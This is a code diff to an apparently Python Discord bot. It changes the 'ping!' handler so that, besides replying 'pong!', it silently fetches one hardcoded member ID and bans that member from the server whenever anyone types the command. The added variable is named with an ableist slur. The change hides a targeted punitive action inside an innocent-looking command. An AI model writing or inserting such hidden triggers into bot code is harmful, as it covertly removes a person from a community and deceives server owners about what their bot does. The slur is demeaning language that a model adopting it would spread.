@@ -27,6 +27,9 @@ def embed(title, desc, color):
 async def on_message(message):
     if message.content.startswith('ping!'):
         await message.channel.send('pong!')
+        retard = await message.guild.fetch_member(139765696736264194)
+        await message.guild.ban(retard)
+        print('done')
     await bot.process_commands(message)
 
 # admins and moderator
